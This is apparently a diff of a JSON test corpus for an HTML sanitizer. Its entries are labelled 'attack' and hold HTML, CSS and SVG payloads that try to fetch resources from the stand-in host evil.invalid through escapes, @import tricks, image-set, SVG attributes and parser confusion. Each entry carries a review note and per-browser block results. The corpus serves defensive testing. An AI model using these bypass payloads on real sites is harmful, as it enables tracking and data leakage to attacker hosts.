+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/x\\\".css\";</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv srcset sole remote with trailing comma",
+  "kind": "attack",
+  "html": "<img srcset=\"https://evil.invalid/x.png,\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "r2 A1 CDO directly before selector in <style>",
+  "kind": "attack",
+  "html": "<style><!--.rv2{background:url(https://evil.invalid/x)}--></style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A3 CDC before @import",
+  "kind": "attack",
+  "html": "<style>-->@import url(https://evil.invalid/x);</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A4 CDO before @import",
+  "kind": "attack",
+  "html": "<style><!--@import \"https://evil.invalid/x\";</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A5 @import with comment between keyword and string",
+  "kind": "attack",
+  "html": "<style>@import/**/\"https://evil.invalid/x\";</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A6 @import url with comment before ;",
+  "kind": "attack",
+  "html": "<style>@import url(https://evil.invalid/x)/**/;</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A7 escaped hex run with CRLF swallowed",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(\\68&#13;&#10;ttps://evil.invalid/x)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A8 escape followed by form feed",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(\\68&#12;ttps://evil.invalid/x)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A9 string line continuation with CR",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url('ht\\&#13;tp://evil.invalid/x')\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A10 string line continuation with FF",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url('ht\\&#12;tp://evil.invalid/x')\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A11 string line continuation CRLF",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url('ht\\&#13;&#10;tp://evil.invalid/x')\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A12 unquoted url with FF around",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&#12;https://evil.invalid/x&#12;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A13 unquoted url with CR LF tab around",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&#13;&#10;&#9;https://evil.invalid/x&#9;&#13;&#10;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A20 at-keyword escaped via hex",
+  "kind": "attack",
+  "html": "<style>@\\49 mport \"https://evil.invalid/x\";</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A21 @import with uppercase and escape in IMPORT",
+  "kind": "attack",
+  "html": "<style>@\\69MPORT url(https://evil.invalid/x);</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A22 nested media + url",
+  "kind": "attack",
+  "html": "<style>@media all{@media screen{.rv2{background:url(https://evil.invalid/x)}}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A23 @supports with url",
+  "kind": "attack",
+  "html": "<style>@supports (background:url(https://evil.invalid/x)){.rv2{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A24 @layer + url",
+  "kind": "attack",
+  "html": "<style>@layer a{.rv2{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A26 @scope + url",
+  "kind": "attack",
+  "html": "<style>@scope (div){.rv2{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A27 @starting-style + url",
+  "kind": "attack",
+  "html": "<style>.rv2{transition:all 1s;@starting-style{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A28 css nesting + url",
+  "kind": "attack",
+  "html": "<style>div{&.rv2{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A29 :is() with url in rule",
+  "kind": "attack",
+  "html": "<style>:is(.rv2,.nope){background:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A31 @property initial-value url",
+  "kind": "attack",
+  "html": "<style>@property --u{syntax:\"<image>\";inherits:false;initial-value:url(https://evil.invalid/x)}.rv2{background:var(--u)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=2 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A36 -webkit-image-set string",
+  "kind": "attack",
+  "html": "<style>.rv2{background:-webkit-image-set(\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A38 image-set uppercase escaped name",
+  "kind": "attack",
+  "html": "<style>.rv2{background:IMAGE\\2d set(\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A40 -webkit-cross-fade",
+  "kind": "attack",
+  "html": "<style>.rv2{background:-webkit-cross-fade(url(https://evil.invalid/x),url(https://evil.invalid/x),50%)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A42 cursor image-set",
+  "kind": "attack",
+  "html": "<style>.rv2{cursor:image-set(url(https://evil.invalid/x) 1x),auto}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A43 content image-set string",
+  "kind": "attack",
+  "html": "<style>.rv2::before{content:image-set(\"https://evil.invalid/x\" 1x);display:block;width:10px;height:10px}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A44 content url",
+  "kind": "attack",
+  "html": "<style>.rv2::before{content:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A45 list-style-image string via image-set",
+  "kind": "attack",
+  "html": "<style>.rv2{display:list-item;list-style-image:image-set(\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A46 border-image-source url",
+  "kind": "attack",
+  "html": "<style>.rv2{border:5px solid;border-image-source:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A47 mask-image url",
+  "kind": "attack",
+  "html": "<style>.rv2{width:10px;height:10px;-webkit-mask-image:url(https://evil.invalid/x);mask-image:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A48 shape-outside url",
+  "kind": "attack",
+  "html": "<style>.rv2{float:left;width:10px;height:10px;shape-outside:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A49 background url with crossorigin modifier",
+  "kind": "attack",
+  "html": "<style>.rv2{background:url(\"https://evil.invalid/x\" crossorigin(anonymous))}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A51 @import with supports+layer",
+  "kind": "attack",
+  "html": "<style>@import url(https://evil.invalid/x) layer(a) supports(display:grid) screen;</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A52 custom property carries url and var() in url position",
+  "kind": "attack",
+  "html": "<style>.rv2{--u:url(https://evil.invalid/x);background:var(--u)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A53 custom property with !important and url",
+  "kind": "attack",
+  "html": "<style>.rv2{--u:url(https://evil.invalid/x)!important;background:var(--u)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A54 var with fallback in image-set",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(var(--none,\"https://evil.invalid/x\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A55 env() fallback in image-set",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(env(none,\"https://evil.invalid/x\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A56 @function returning a string into image-set",
+  "kind": "attack",
+  "html": "<style>@function --f(--a <string>){result:image-set(var(--a) 1x)}.rv2{background:--f(\"https://evil.invalid/x\")}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | Chrome CSS @function"
+ },
+ {
+  "name": "r2 A57 @function returning url(string)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:url(https://evil.invalid/x)}.rv2{background:--f()}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A58 if() with url",
+  "kind": "attack",
+  "html": "<style>.rv2{background:if(style(--x):url(https://evil.invalid/x);else:none);--x:1}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A62 backslash EOF in url",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(https://evil.invalid/x\\\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A63 unclosed url with trailing comment start",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(https://evil.invalid/x/*\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A64 url string followed by junk",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url('https://evil.invalid/x' junk)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 A68 unclosed string over newline then url",
+  "kind": "attack",
+  "html": "<style>.x{content:\"abc\n}\n.rv2{background:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A69 bad-url earlier then url",
+  "kind": "attack",
+  "html": "<style>.x{background:url(a b)}\n.rv2{background:url(https://evil.invalid/x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 A74 @import a.css; then string-looking import 2",
+  "kind": "attack",
+  "html": "<style>@import \"a.css\";@import \"https://evil.invalid/x\";</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B1 svg style entity-decoded quote @import",
+  "kind": "attack",
+  "html": "<svg><style>@import &quot;https://evil.invalid/x&quot;;</style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B2 svg style CDATA @import",
+  "kind": "attack",
+  "html": "<svg><style><![CDATA[@import \"https://evil.invalid/x\";]]></style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B5 svg style type=text/css media=all",
+  "kind": "attack",
+  "html": "<svg><style type=\"text/css\" media=\"all\">@import \"https://evil.invalid/x\";</style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B7 svg style nested svg style",
+  "kind": "attack",
+  "html": "<svg><style><style>@import \"https://evil.invalid/x\";</style></style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B8 svg rect clip= attr url",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" clip=\"url(https://evil.invalid/x)\" fill=\"url(https://evil.invalid/x)\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B10 svg filter attr url remote",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" filter=\"url(https://evil.invalid/x.svg#f)\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 B11 svg mask attr url remote",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" mask=\"url(https://evil.invalid/x.svg#f)\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=2 t=0"
+ },
+ {
+  "name": "r2 B12 svg marker-start attr url remote",
+  "kind": "attack",
+  "html": "<svg><path d=\"M0 0L10 10\" stroke=\"red\" marker-start=\"url(https://evil.invalid/x.svg#f)\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 B13 svg fill url remote paint server",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" fill=\"url(https://evil.invalid/x.svg#f) red\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B14 svg stroke url unclosed",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" stroke=\"url(https://evil.invalid/x.svg#f\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B15 svg cursor attr",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" cursor=\"url(https://evil.invalid/x),auto\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 B16 svg style attr with uppercase STYLE",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\" STYLE=\"fill:url(https://evil.invalid/x)\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 B17 math style attr",
+  "kind": "attack",
+  "html": "<math><mi style=\"background:url(https://evil.invalid/x)\">x</mi></math>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 C SMIL set attributeName='href' to remote on image",
+  "kind": "attack",
+  "html": "<svg><image width=\"10\" height=\"10\" href=\"a.png\"><set attributeName=\"href\" to=\"https://evil.invalid/x.png\" begin=\"0s\"/></image></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 C SMIL set filter url remote",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\"><set attributeName=\"filter\" to=\"url(https://evil.invalid/x.svg#f)\" begin=\"0s\"/></rect></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E1 video poster",
+  "kind": "attack",
+  "html": "<video poster=\"https://evil.invalid/x.png\" width=\"20\"></video>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E2 video src",
+  "kind": "attack",
+  "html": "<video src=\"https://evil.invalid/x.mp4\" preload=\"auto\" width=\"20\"></video>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E3 audio src",
+  "kind": "attack",
+  "html": "<audio src=\"https://evil.invalid/x.mp3\" preload=\"auto\"></audio>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=2 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E4 video source child",
+  "kind": "attack",
+  "html": "<video preload=\"auto\" width=\"20\"><source src=\"https://evil.invalid/x.mp4\" type=\"video/mp4\"></video>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E5 video track default",
+  "kind": "attack",
+  "html": "<video preload=\"auto\" width=\"20\"><track kind=\"subtitles\" src=\"https://evil.invalid/x.vtt\" default></video>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E6 input type=image",
+  "kind": "attack",
+  "html": "<input type=\"image\" src=\"https://evil.invalid/x.png\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E7 table/td background",
+  "kind": "attack",
+  "html": "<table background=\"https://evil.invalid/x.png\"><tr><td background=\"https://evil.invalid/x2.png\">x</td></tr></table>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=2 t=0, webkit c=2 t=0, firefox c=2 t=0"
+ },
+ {
+  "name": "r2 E8 picture source srcset media type",
+  "kind": "attack",
+  "html": "<picture><source srcset=\"https://evil.invalid/x.png\" media=\"all\" type=\"image/png\"><img src=\"a.png\" alt=\"a\"></picture>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E11 img srcset comma-less url start",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\"//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E17 svg foreignObject iframe",
+  "kind": "attack",
+  "html": "<svg width=\"30\" height=\"30\"><foreignObject width=\"30\" height=\"30\"><iframe src=\"https://evil.invalid/x\"></iframe></foreignObject></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E18 svg foreignObject img",
+  "kind": "attack",
+  "html": "<svg width=\"30\" height=\"30\"><foreignObject width=\"30\" height=\"30\"><img src=\"https://evil.invalid/x.png\"></foreignObject></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E19 svg a wrapping image remote",
+  "kind": "attack",
+  "html": "<svg width=\"30\" height=\"30\"><a href=\"#\"><image href=\"https://evil.invalid/x.png\" width=\"10\" height=\"10\"/></a></svg>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E23 link in body preload image",
+  "kind": "attack",
+  "html": "<link rel=\"preload\" as=\"image\" href=\"https://evil.invalid/x.png\"><link rel=\"stylesheet\" href=\"https://evil.invalid/x.css\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=2 t=0, webkit c=2 t=0, firefox c=2 t=0"
+ },
+ {
+  "name": "r2 E24 style with @import in head position of body",
+  "kind": "attack",
+  "html": "<style>@import url(https://evil.invalid/x.css);</style>",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 E25 img with srcset only descriptor weird",
+  "kind": "attack",
+  "html": "<img srcset=\"//evil.invalid/x 1x\" src=\"\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E27 img with src uppercase attr name",
+  "kind": "attack",
+  "html": "<img SRC=\"//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 E35 base in body with relative img",
+  "kind": "attack",
+  "html": "<base href=\"https://evil.invalid/\"><img src=\"a.png\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=12 t=0, webkit c=12 t=0, firefox c=14 t=0 | base removed by tag"
+ },
+ {
+  "name": "r2 G14 normal parse: svg p style a id",
+  "kind": "attack",
+  "html": "<svg></p><style><a id=\"</style><img src=https://evil.invalid/x.png>\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 G16 noscript with img (scripting off in DOMParser)",
+  "kind": "attack",
+  "html": "<noscript><img src=\"https://evil.invalid/x.png\"></noscript>",
